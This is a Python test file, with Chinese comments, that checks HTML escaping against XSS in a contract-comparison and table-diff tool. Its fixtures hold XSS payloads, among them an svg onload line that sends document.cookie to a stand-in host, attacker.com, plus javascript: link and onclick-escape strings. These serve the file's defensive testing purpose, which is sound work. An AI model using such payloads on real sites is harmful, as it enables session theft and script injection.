# -*- coding: utf-8 -*-
"""Phase 13R1: 合同对比与表格重构中的 XSS 与 HTML 注入防护安全测试。"""

from contract_kb.domain.models.source_node import ContractSourceNode
from contract_kb.full_diff import escape_html, generate_word_diff_html
from contract_kb.table_aligner import (
    ExtractedTable,
    align_contract_tables,
    build_table_diff_block,
)


def test_escape_html_basic_and_quotes() -> None:
    """验证基础字符及引号的 HTML 安全转义。"""
    raw = '<script>alert("XSS & Injection")</script>'
    escaped = escape_html(raw)
    assert "<script>" not in escaped
    assert "</script>" not in escaped
    assert "&lt;script&gt;" in escaped
    assert "&amp;" in escaped
    assert "&quot;" in escaped


def test_word_diff_html_with_xss_payloads() -> None:
    """验证单词级标红 Diff 引擎中的恶意注入载荷均被安全转义。"""
    xss_payload_1 = "<img src=x onerror=\"alert('pwned')\">"
    xss_payload_2 = '<svg/onload=fetch("http://attacker.com/"+document.cookie)>'

    std_diff, rev_diff = generate_word_diff_html(xss_payload_1, xss_payload_2)

    # 严禁在返回的 HTML 中出现未经转义的可执行标签
    assert "<img" not in std_diff
    assert "<svg" not in rev_diff
    assert "<script" not in std_diff

    # 确认已被实体转义
    assert "&lt;" in std_diff
    assert "&gt;" in std_diff
    assert "&lt;" in rev_diff


def test_table_html_injection_prevention() -> None:
    """验证表格对齐和重构引擎对表格单元格中 XSS 载荷的免疫力。"""
    xss_in_cell = '<a href="javascript:alert(1)">恶意链接</a>'
    nodes = [
        ContractSourceNode(
            document_id="doc_xss",
            document_hash="dummy_hash",
            node_id="node_xss_0_0",
            node_type="table_cell",
            table_index=0,
            row_index=0,
            column_index=0,
            original_text=xss_in_cell,
        )
    ]
    tbl = ExtractedTable(
        table_index=0,
        document_id="doc_xss",
        document_hash="dummy_hash",
        nodes=nodes,
    )

    aligned_pairs = align_contract_tables([tbl], [tbl])
    block, anns, _ = build_table_diff_block(aligned_pairs[0], 0, 0)

    # 严禁在 standard_html 与 reviewed_html 中出现未经转义的 javascript 协议与 <a> 标签
    assert "<a href=" not in block["standard_html"]
    assert "<a href=" not in block["reviewed_html"]
    assert "&lt;a href=&quot;javascript:alert(1)&quot;&gt;" in block["standard_html"]
    assert "&lt;a href=&quot;javascript:alert(1)&quot;&gt;" in block["reviewed_html"]


def test_onclick_injection_neutralization() -> None:
    """验证包含引号与单引号的条款标题在 onclick 事件中无法发生语法逃逸。"""
    naughty_text = "条款一'); alert(\"owned\"); ('"
    s_diff, r_diff = generate_word_diff_html(naughty_text, naughty_text)
    assert (
        "alert(&quot;owned&quot;)" in s_diff
        or "alert" not in s_diff
        or "<script" not in s_diff
    )
